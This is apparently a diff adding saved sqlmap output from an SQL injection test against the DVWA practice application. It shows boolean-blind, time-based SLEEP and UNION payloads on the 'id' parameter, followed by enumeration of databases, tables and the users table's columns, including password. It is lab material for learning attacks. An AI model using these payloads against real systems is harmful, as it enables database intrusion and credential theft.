@@ -1,0 +1,107 @@
+sqlmap identified the following injection point(s) with a total of 40 HTTP(s) requests:
+---
+Parameter: id (POST)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: id=(SELECT (CASE WHEN (7700=7700) THEN 1 ELSE (SELECT 8570 UNION SELECT 6918) END))&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1 AND (SELECT 5892 FROM (SELECT(!SLEEP(5)))qJIW)&Submit=Submit
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: id=1 UNION ALL SELECT NULL,CONCAT(0x71706b6b71,0x4a6449585065764f45595569715a4441594a736f6a4753636b64747a4f5a516553686d7241545242,0x7162707671)-- -&Submit=Submit
+---
+web application technology: Nginx 1.30.1
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+available databases [2]:
+[*] dvwa
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (POST)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: id=(SELECT (CASE WHEN (7700=7700) THEN 1 ELSE (SELECT 8570 UNION SELECT 6918) END))&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1 AND (SELECT 5892 FROM (SELECT(!SLEEP(5)))qJIW)&Submit=Submit
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: id=1 UNION ALL SELECT NULL,CONCAT(0x71706b6b71,0x4a6449585065764f45595569715a4441594a736f6a4753636b64747a4f5a516553686d7241545242,0x7162707671)-- -&Submit=Submit
+---
+web application technology: Nginx 1.30.1
+back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
+available databases [2]:
+[*] dvwa
+[*] information_schema
+
+Database: dvwa
+[2 tables]
++-----------+
+| guestbook |
+| users     |
++-----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (POST)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: id=(SELECT (CASE WHEN (7700=7700) THEN 1 ELSE (SELECT 8570 UNION SELECT 6918) END))&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1 AND (SELECT 5892 FROM (SELECT(!SLEEP(5)))qJIW)&Submit=Submit
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: id=1 UNION ALL SELECT NULL,CONCAT(0x71706b6b71,0x4a6449585065764f45595569715a4441594a736f6a4753636b64747a4f5a516553686d7241545242,0x7162707671)-- -&Submit=Submit
+---
+web application technology: Nginx 1.30.1
+back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
+available databases [2]:
+[*] dvwa
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (POST)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: id=(SELECT (CASE WHEN (7700=7700) THEN 1 ELSE (SELECT 8570 UNION SELECT 6918) END))&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1 AND (SELECT 5892 FROM (SELECT(!SLEEP(5)))qJIW)&Submit=Submit
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: id=1 UNION ALL SELECT NULL,CONCAT(0x71706b6b71,0x4a6449585065764f45595569715a4441594a736f6a4753636b64747a4f5a516553686d7241545242,0x7162707671)-- -&Submit=Submit
+---
+web application technology: Nginx 1.30.1
+back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
+available databases [2]:
+[*] dvwa
+[*] information_schema
+
+Database: dvwa
+Table: users
+[8 columns]
++--------------+-------------+
+| Column       | Type        |
++--------------+-------------+
+| user         | varchar(15) |
+| avatar       | varchar(70) |
+| failed_login | int(3)      |
+| first_name   | varchar(15) |
+| last_login   | timestamp   |
+| last_name    | varchar(15) |
+| password     | varchar(32) |
+| user_id      | int(6)      |
++--------------+-------------+
+
